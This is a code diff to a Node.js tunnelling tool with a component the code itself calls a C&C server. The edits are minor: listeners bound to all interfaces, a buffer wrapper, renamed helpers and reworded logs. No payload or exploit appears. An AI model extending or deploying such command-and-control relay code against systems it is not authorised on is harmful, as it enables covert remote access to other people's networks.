@@ -160,7 +160,7 @@ var TunnelPacket = (function(){
           Utils.bufferCopy(Utils.uint16GetBytes(obj.payload.length), 0, result, 7, 2);
           Utils.bufferCopy(Utils.strGetBytes(obj.payload), 0, result, 9, obj.payload.length);
           Utils.hexDumpBuffer(result.buffer);
-          return result.buffer;
+          return new Buffer(result.buffer);
 	  }
 
     return { TCP_SYN   : TCP_SYN,
@@ -195,7 +195,7 @@ var Tunnel = (function(){
             adminSocket.end();
         }
         adminSocket = _adminSocket;
-        Utils.log("Waiting for clients");
+
         listener = net.createServer(function(client) {
 
             client.on("data", function(data){
@@ -212,15 +212,16 @@ var Tunnel = (function(){
 
         });
 
-        listener.listen(clientPort);
+        listener.listen(clientPort, "0.0.0.0", function(){
+            Utils.log("Waiting for clients");
+        });
 
         adminSocket.on("data", function(data){
             onDataFromAdmin(data);
         });
 
         adminSocket.on("close", function(data){
-            Utils.log("Connection closed, Tunnel destroyed");
-
+            Utils.log("Connection with controller closed, Tunnel destroyed");
         });
 
         adminSocket.on("error", function(){});
@@ -229,7 +230,7 @@ var Tunnel = (function(){
     function onClientConnected(client)
     {
         var packet = {
-            ip : Utils.parseIP(client.remoteAddress),
+            ip : Utils.parseIp(client.remoteAddress),
             port : client.remotePort,
             type : TunnelPacket.TCP_SYN,
             payload : "",
@@ -241,7 +242,7 @@ var Tunnel = (function(){
     function onClientDisconnected(client)
     {
         var packet = {
-            ip : Utils.parseIP(client.remoteAddress),
+            ip : Utils.parseIp(client.remoteAddress),
             port : client.remotePort,
             type : TunnelPacket.TCP_FIN,
             payload : "",
@@ -305,7 +306,7 @@ var CCServer = (function() {
                 	socket.end();
                 }
         	});
-        }).listen(config.adminPort, function(){
+        }).listen(config.adminPort, "0.0.0.0", function(){
           Utils.log("C&C Server started, waiting for controllers");
         });
     }
